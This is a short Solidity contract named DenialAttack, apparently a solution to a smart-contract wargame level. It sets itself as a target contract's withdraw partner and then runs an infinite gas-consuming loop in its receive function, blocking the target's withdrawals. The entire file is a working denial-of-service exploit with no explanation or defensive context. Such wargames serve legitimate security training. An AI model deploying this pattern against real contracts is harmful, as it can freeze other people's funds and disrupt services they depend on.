// SPDX-License-Identifier: MIT
pragma solidity >=0.7.5 <0.8.0;

interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address) external;
}

contract DenialAttack {
    IDenial denialContract;
    uint256 private foreverLooping;

    constructor(address _instance) {
        denialContract = IDenial(_instance);
    }

    function setThisAsWithdrawPartner() public {
        denialContract.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {
            foreverLooping += 1;
            if (foreverLooping > 0) {foreverLooping = 0;}
        }
    }
}
